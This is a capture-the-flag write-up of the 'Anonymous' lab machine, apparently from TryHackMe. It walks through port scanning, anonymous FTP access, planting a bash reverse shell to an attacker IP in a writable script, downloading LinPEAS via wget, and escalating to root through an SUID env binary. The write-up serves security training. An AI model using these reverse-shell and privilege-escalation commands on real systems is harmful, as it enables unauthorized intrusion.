---
title: "Anonymous - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - Anonymous
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - thm
  - tryhackme
  - machine
  - medium
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Anonymous
![](https://kar0nx.github.io/assets/images/writeup/876a5185c429c9703e625cb48c39637b.png)

## Reconnaissance

IP: 10.10.144.53
### NMAP

Start with a full port scan and service detection:

```
nmap -T4 -A -p- 10.10.144.53
```

### **Scan Results:**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-27 09:39 EST
Nmap scan report for 10.10.144.53
Host is up (0.043s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.129.113
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/27%OT=21%CT=1%CU=36277%PV=Y%DS=2%DC=T%G=Y%TM=67C0
OS:7954%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508
OS:ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
OS:ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-02-27T14:40:02+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-27T14:40:03
|_  start_date: N/A
|_clock-skew: mean: -15s, deviation: 0s, median: -15s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   42.30 ms 10.11.0.1
2   42.77 ms 10.10.144.53

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.58 seconds

```

Identified open ports:

- **21/tcp** – FTP (vsftpd 2.0.8 or later) – **Anonymous login allowed**
    
- **22/tcp** – SSH (OpenSSH 7.6p1)
    
- **139/tcp, 445/tcp** – SMB (Samba 4.7.6-Ubuntu)

FTP allows anonymous access, which could be key for further exploration.
## FTP

Connect to the FTP server:

```
ftp 10.10.144.53    
```

Inside the `/scripts` directory, we find the following files:

```
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1161 Feb 27 14:44 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

Download the files:

```
mget *
```

The **clean.sh** script repeatedly deletes files from `/tmp` and logs the results in `removed_files.log`.
## SMB

Use `smbclient` to check for shared folders:

```
smbclient -L \\10.10.144.53
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250227170813.png)

A shared folder was found, but nothing of further interest.
## Gaining access

Since we can download and upload files via FTP, we can exploit this by modifying `clean.sh` to gain a reverse shell.
Edit the script and add a reverse shell:

```
/bin/bash -i >& /dev/tcp/10.11.129.113/5555 0>&1
```

Upload the modified script back to the server:

```
put clean.sh
```

Then, start a listener on our machine:

```
nc -lvnp 5555
```

Once the script executes, we obtain a shell.

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250227161222.png)
## Privilege Escalation

Upload and execute **LinPEAS** to identify vulnerabilities:

```
cd /opt/linpeas
python3 -m http.server 80
```

On the target machine:

```
wget http://10.11.129.113/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS detects that **/usr/bin/env** has SUID.

Confirm this with:

```
find / -perm -u=s -type f 2>/dev/null
```

Using GTFOBins, we exploit `env` to escalate privileges:
https://gtfobins.github.io/gtfobins/env/#suid

```
/usr/bin/env /bin/bash -p
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250227165439.png)

Navigate to `/root/` and read the flag:

```
cat /root/root.txt
```